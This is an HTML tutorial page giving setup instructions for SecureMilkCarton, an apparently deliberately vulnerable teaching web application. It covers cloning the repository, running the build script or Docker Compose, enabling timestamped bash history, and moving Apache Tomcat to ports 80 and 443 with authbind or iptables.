&lt;h2 id=&quot;project-repository&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#project-repository&quot; aria-label=&quot;project repository permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Project Repository&lt;/h2&gt;
&lt;p&gt;The SecureMilkCarton project is hosted on my GitHub account, available at: &lt;a href=&quot;https://github.com/thomaslaurenson/SecureMilkCarton&quot;&gt;SecureMilkCarton&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The repository is well documented, so please look over the &lt;a href=&quot;https://github.com/thomaslaurenson/SecureMilkCarton/blob/master/README.md&quot;&gt;README&lt;/a&gt; for technical documentation including installation, configuration, vulnerabilities, project structure, and some general usage examples.&lt;/p&gt;
&lt;h2 id=&quot;project-exercises-and-answers&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#project-exercises-and-answers&quot; aria-label=&quot;project exercises and answers permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Project Exercises and Answers&lt;/h2&gt;
&lt;p&gt;Included with SecureMilkCarton are a collection of tasks, somewhat similar to the assessment I wrote for my &lt;em&gt;Introduction to Information Security&lt;/em&gt; course. The tasks and answers are provided in the folder called &lt;code class=&quot;language-text&quot;&gt;exercises&lt;/code&gt; in a PDF named &lt;code class=&quot;language-text&quot;&gt;exercises.pdf&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;answers.pdf&lt;/code&gt;. Since I want this project to be used by other tertiary institutes, the exercises and model answers are encrypted and can only be accessed with a password. This password can be provided to faculty members who can prove that they are teaching courses in accredited educational institutes. Please email me for additional information.&lt;/p&gt;
&lt;h2 id=&quot;securemilkcarton-quick-start&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#securemilkcarton-quick-start&quot; aria-label=&quot;securemilkcarton quick start permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SecureMilkCarton: Quick Start&lt;/h2&gt;
&lt;h3 id=&quot;option-1-build-script&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#option-1-build-script&quot; aria-label=&quot;option 1 build script permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Option 1: Build Script&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Install Ubuntu 18.04 server on a VM&lt;/li&gt;
&lt;li&gt;Make sure git is installed:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Clone this repository to your home directory:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~ &amp;&amp; git clone https://github.com/thomaslaurenson/SecureMilkCarton.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Run the web application build script:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You will be prompted for the MySQL root user password, use: &lt;code class=&quot;language-text&quot;&gt;&lt;/code&gt;passw0rd`&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/SecureMilkCarton/build &amp;&amp; chmod u+x build.sh &amp;&amp; sudo ./build.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Check the web application in a web browser:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&lt;server-ip-address&gt;:8080/securemilkcarton/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;option-2-docker&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#option-2-docker&quot; aria-label=&quot;option 2 docker permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Option 2: Docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Make sure git is installed:&lt;/li&gt;
&lt;li&gt;Clone this repository to your home directory:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~ &amp;&amp; git clone https://github.com/thomaslaurenson/SecureMilkCarton.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Install Docker and Docker Compose:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install docker docker-compose&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Run Docker Compose:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/SecureMilkCarton/docker &amp;&amp; docker-compose up&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Check the web application in a web browser:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&lt;server-ip-address&gt;:8080/securemilkcarton/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;securemilkcarton-installation-using-build-script&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#securemilkcarton-installation-using-build-script&quot; aria-label=&quot;securemilkcarton installation using build script permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SecureMilkCarton: Installation using Build Script&lt;/h2&gt;
&lt;p&gt;The first step to install SecureMilkCarton is to install and configure a suitable virtual machine. This tutorial follows a virtual machine installed with Ubuntu Linux Server version 18.04 LTS that is hosted on VMWare vSphere (no notable differences in setup compared to VMWare Workstation).&lt;/p&gt;
&lt;p&gt;Create a new virtual machine and install using default options.&lt;/p&gt;
&lt;p&gt;When installed, make sure to update the operating system:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt update &amp;&amp; sudo apt upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Install VMWare tools (if using VMWare):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install open-vm-tools&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Clone this repository to your home directory:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~
git clone https://github.com/thomaslaurenson/SecureMilkCarton.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;From here, you can use the &lt;code class=&quot;language-text&quot;&gt;build.sh&lt;/code&gt; script to install all required packages, configure the services, and then build and deploy the SecureMilkCarton web application.&lt;/p&gt;
&lt;p&gt;Make sure you are in the &lt;code class=&quot;language-text&quot;&gt;build&lt;/code&gt; directory of the git repository:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/SecureMilkCarton/build&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure you have executable rights to the &lt;code class=&quot;language-text&quot;&gt;build.sh&lt;/code&gt; script:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;chmod u+x build.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Run the &lt;code class=&quot;language-text&quot;&gt;build.sh&lt;/code&gt; script using sudo rights:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo ./build.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;optional-install-better-history&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#optional-install-better-history&quot; aria-label=&quot;optional install better history permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Optional: Install better history&lt;/h3&gt;
&lt;p&gt;I find when deploying this assessment for learners, it is beneficial to improve the history retention, that is, the information retained by the &lt;code class=&quot;language-text&quot;&gt;~/.bash_history&lt;/code&gt; file and associated &lt;code class=&quot;language-text&quot;&gt;history&lt;/code&gt; command. This project includes a simple script (&lt;code class=&quot;language-text&quot;&gt;better_history.sh&lt;/code&gt;) that enhances the history configuration, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Preserves history when multiple different connections to a system are established (e.g., multiple SSH or PuTTY sessions)&lt;/li&gt;
&lt;li&gt;Appends date/time stamps to each history entry&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To include a better history, execute the following actions to run the script:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo su
cd ~/SecureMilkCarton/build/
./better_history.sh
exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;optional-changing-the-default-ports&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#optional-changing-the-default-ports&quot; aria-label=&quot;optional changing the default ports permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Optional: Changing the default ports&lt;/h3&gt;
&lt;p&gt;It might be easier to change the default Apache Tomcat ports. After a default installation, Apache Tomcat runs on the following ports:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HTTP on port 8080&lt;/li&gt;
&lt;li&gt;HTTPS on port 8443 (if configured)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For learners new to web applications, and web servers in general, it might be easier to configure Apache Tomcat to operate on default HTTP/HTTPS ports (80/443). The following instructions will make this configuration change using the &lt;code class=&quot;language-text&quot;&gt;authbind&lt;/code&gt; package.&lt;/p&gt;
&lt;p&gt;Install the &lt;code class=&quot;language-text&quot;&gt;authbind&lt;/code&gt; package:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install authbind&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Switch to the root user:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo su&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make port 80 and port 443 available to authbind, and set the owner to &lt;code class=&quot;language-text&quot;&gt;tomcat&lt;/code&gt; (this account is created during during the building of the web applicaiton):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;touch /etc/authbind/byport/80
chmod 500 /etc/authbind/byport/80
chown tomcat /etc/authbind/byport/80
touch /etc/authbind/byport/443
chmod 500 /etc/authbind/byport/443
chown tomcat /etc/authbind/byport/443&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Create a file named &lt;code class=&quot;language-text&quot;&gt;setenv.sh&lt;/code&gt; in the tomcat folder:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /opt/tomcat/bin/setenv.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Enter the following content:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;CATALINA_OPTS=&quot;-Djava.net.preferIPv4Stack=true&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Open the tomcat start-up script:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /opt/tomcat/bin/startup.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Find the following line:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And replace the line with:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;exec authbind --deep &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot; `&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finally, change the tomcat server configuration. Open the &lt;code class=&quot;language-text&quot;&gt;server.xml&lt;/code&gt; file:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /opt/tomcat/conf/server.xml&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Find the entry for the service. This should be named &lt;code class=&quot;language-text&quot;&gt;Catalina&lt;/code&gt;, and should look like the output snippet below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;xml&quot;&gt;&lt;pre class=&quot;language-xml&quot;&gt;&lt;code class=&quot;language-xml&quot;&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;Service&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Catalina&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;Connector&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;8080&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;HTTP/1.1&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
               &lt;span class=&quot;token attr-name&quot;&gt;connectionTimeout&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;20000&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
               &lt;span class=&quot;token attr-name&quot;&gt;redirectPort&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;8443&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This configuration file needs to be changed from the default Apache Tomcat ports to the new ports we specified above. The final result will look like the output snippet below. Basically, we just changed port 8080 to 80, and port 8443 to 443.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;xml&quot;&gt;&lt;pre class=&quot;language-xml&quot;&gt;&lt;code class=&quot;language-xml&quot;&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;Service&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;Catalina&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;Connector&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;80&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;HTTP/1.1&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
               &lt;span class=&quot;token attr-name&quot;&gt;connectionTimeout&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;20000&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
               &lt;span class=&quot;token attr-name&quot;&gt;redirectPort&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;443&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Save and exit the files. Then restart the Apache Tomcat service:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo systemctl restart tomcat&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finished.&lt;/p&gt;
&lt;p&gt;An alternative method to the using authbind is to utilize &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; to forward traffic from the default HTTP/HTTPS ports to the ports tomcat uses. This method is simple, however, I feel it interferes with any &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; firewall configuration that can be used.&lt;/p&gt;
&lt;p&gt;The following two &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; rules will forward all traffic from port 80 and 443 to the default tomcat ports of 8080 and 8443. Please note, in the following example, the Internet-facing adapter is named &lt;code class=&quot;language-text&quot;&gt;ens160&lt;/code&gt;, you will need to modify this value for the network interface on your system (e.g., &lt;code class=&quot;language-text&quot;&gt;eth0&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo iptables -t nat -A PREROUTING -i ens160 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i ens160 -p tcp --dport 443 -j REDIRECT --to-port 8443&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
